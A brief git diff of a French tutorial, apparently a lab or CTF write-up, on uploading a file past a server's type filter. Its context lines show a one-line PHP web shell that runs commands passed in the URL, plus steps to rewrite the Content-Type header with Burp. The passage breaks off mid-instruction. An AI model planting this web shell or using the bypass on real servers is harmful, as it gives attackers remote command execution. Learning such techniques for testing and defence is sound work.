@@ -8,7 +8,7 @@ Ce dossier devra contenir les lignes suivantes :
 echo shell_exec($_GET['cmd']);
 ?>*
 ```
-Ensuite, nous avant de l'upload, nous utiliserons une extension de navigateur comme par exemple Foxy proxy et le logiciel Burp afin de pouvoir changer le fichier envoyé.
+* Ensuite, nous avant de l'upload, nous utiliserons une extension de navigateur comme par exemple Foxy proxy et le logiciel Burp afin de pouvoir changer le fichier envoyé.
 Grace a burp, nous devons modifier la ligne :
 `Content-Type: application/octet-stream`
 par :
